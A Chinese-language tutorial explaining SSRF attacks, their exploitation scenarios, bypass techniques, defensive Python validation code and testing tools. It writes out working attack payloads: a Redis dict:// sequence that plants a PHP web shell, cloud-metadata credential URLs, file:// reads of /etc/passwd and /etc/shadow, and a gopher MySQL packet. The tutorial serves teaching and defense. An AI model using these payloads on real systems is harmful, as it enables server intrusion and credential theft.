---
order: 55
title: SSRF攻击
module: cybersecurity
category: 'eng-infra'
difficulty: intermediate
description: 服务端请求伪造攻击原理、利用场景与防御策略详解。
author: fanquanpp
updated: '2026-06-14'
related:
  - cybersecurity/安全运营中心
  - cybersecurity/文件上传漏洞
  - cybersecurity/恶意代码分析
  - cybersecurity/云安全
prerequisites:
  - cybersecurity/安全基础与防御
---

## 1. SSRF 攻击原理

### 1.1 什么是 SSRF

服务端请求伪造（Server-Side Request Forgery, SSRF）是攻击者利用服务器发起请求的功能，使服务器向攻击者指定的目标发起请求，从而访问内网资源或进行内网探测。

### 1.2 攻击流程

```
1. 攻击者构造恶意 URL → 提交给服务器
2. 服务器未验证 URL → 发起请求
3. 服务器获取内网资源 → 返回给攻击者
4. 攻击者获取内网信息/访问内部服务
```

### 1.3 与 CSRF 的区别

| 对比项     | SSRF           | CSRF         |
| ---------- | -------------- | ------------ |
| 请求发起方 | 服务器         | 用户浏览器   |
| 攻击目标   | 内网服务       | 外部用户操作 |
| 核心利用   | 服务器网络位置 | 用户认证状态 |

## 2. SSRF 利用场景

### 2.1 内网探测

```
# 探测内网 IP
http://192.168.1.1
http://10.0.0.1
http://172.16.0.1

# 探测端口
http://internal-server:6379  # Redis
http://internal-server:3306  # MySQL
http://internal-server:9200  # Elasticsearch
```

### 2.2 读取本地文件

```
file:///etc/passwd
file:///etc/shadow
file:///proc/self/environ
```

### 2.3 攻击内网服务

**攻击 Redis**：

```
# 通过 SSRF 向 Redis 发送命令
dict://internal-redis:6379/CONFIG SET dir /var/www/html
dict://internal-redis:6379/CONFIG SET dbfilename shell.php
dict://internal-redis:6379/SET payload "<?php system($_GET['cmd']); ?>"
dict://internal-redis:6379/SAVE
```

**攻击云元数据**：

```
# AWS 元数据
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP 元数据
http://metadata.google.internal/computeMetadata/v1/

# Azure 元数据
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

### 2.4 协议利用

| 协议        | 用途                |
| ----------- | ------------------- |
| `http://`   | 内网探测、服务攻击  |
| `https://`  | 同 HTTP             |
| `file://`   | 读取本地文件        |
| `dict://`   | 攻击 Redis 等       |
| `gopher://` | 构造任意 TCP 数据包 |
| `ftp://`    | FTP 服务探测        |

**Gopher 协议**：

```
# 构造 MySQL 查询
gopher://internal-mysql:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00
```

## 3. SSRF 绕过技术

### 3.1 IP 限制绕过

| 方法         | 示例                                 |
| ------------ | ------------------------------------ |
| 十进制 IP    | `0x7f000001` = `127.0.0.1`           |
| 八进制 IP    | `0177.0.0.1` = `127.0.0.1`           |
| IPv6         | `[::1]` = `127.0.0.1`                |
| 短地址       | `http://t.cn/xxx`                    |
| DNS 重绑定   | 域名先解析为外网 IP，再解析为内网 IP |
| URL 解析差异 | `http://evil.com#@internal.com`      |

### 3.2 DNS 重绑定攻击

```
1. 攻击者控制域名 rebinding.attacker.com
2. 首次解析 → 外网 IP（通过验证）
3. 二次解析 → 内网 IP（实际请求目标）
4. TTL 设为 0，确保快速切换
```

### 3.3 开放重定向绕过

```
# 利用合法网站的重定向功能
http://trusted-site.com/redirect?url=http://internal-server
```

## 4. SSRF 防御

### 4.1 URL 白名单

```python
from urllib.parse import urlparse

ALLOWED_DOMAINS = ['api.example.com', 'cdn.example.com']

def validate_url(url):
    parsed = urlparse(url)

    # 仅允许 HTTP/HTTPS
    if parsed.scheme not in ['http', 'https']:
        raise ValueError("Only HTTP/HTTPS allowed")

    # 域名白名单
    if parsed.hostname not in ALLOWED_DOMAINS:
        raise ValueError("Domain not allowed")

    return url
```

### 4.2 禁用危险协议

```python
# 仅允许 http 和 https
if not url.startswith(('http://', 'https://')):
    raise ValueError("Invalid protocol")
```

### 4.3 内网 IP 过滤

```python
import ipaddress

def is_internal_ip(ip_str):
    ip = ipaddress.ip_address(ip_str)
    internal_ranges = [
        ipaddress.ip_network('10.0.0.0/8'),
        ipaddress.ip_network('172.16.0.0/12'),
        ipaddress.ip_network('192.168.0.0/16'),
        ipaddress.ip_network('127.0.0.0/8'),
        ipaddress.ip_network('169.254.0.0/16'),
        ipaddress.ip_network('::1/128'),
        ipaddress.ip_network('fc00::/7'),
    ]
    return any(ip in net for net in internal_ranges)
```

### 4.4 DNS 解析后验证

```python
import socket

def safe_request(url):
    parsed = urlparse(url)
    hostname = parsed.hostname

    # DNS 解析后检查实际 IP
    ip = socket.gethostbyname(hostname)
    if is_internal_ip(ip):
        raise ValueError("Internal IP not allowed")

    # 使用解析后的 IP 发起请求
    # 防止 DNS 重绑定
```

### 4.5 网络层防御

| 措施         | 描述                   |
| ------------ | ---------------------- |
| 防火墙规则   | 禁止应用服务器访问内网 |
| VPC 网络隔离 | 应用层与数据层分离     |
| 出站代理     | 限制出站请求目标       |
| 云安全组     | 限制元数据访问         |

## 5. SSRF 检测

### 5.1 测试方法

```
# 基础探测
http://127.0.0.1
http://localhost
http://[::1]

# 云元数据
http://169.254.169.254/latest/meta-data/

# 文件读取
file:///etc/passwd

# 时间差异探测
http://192.168.1.1:80  (开放 → 快速响应)
http://192.168.1.1:81  (关闭 → 超时)
```

### 5.2 自动化工具

| 工具       | 特点                    |
| ---------- | ----------------------- |
| SSRFmap    | 自动化 SSRF 利用        |
| Gopherus   | 生成 Gopher Payload     |
| Burp Suite | 手动测试与 Collaborator |
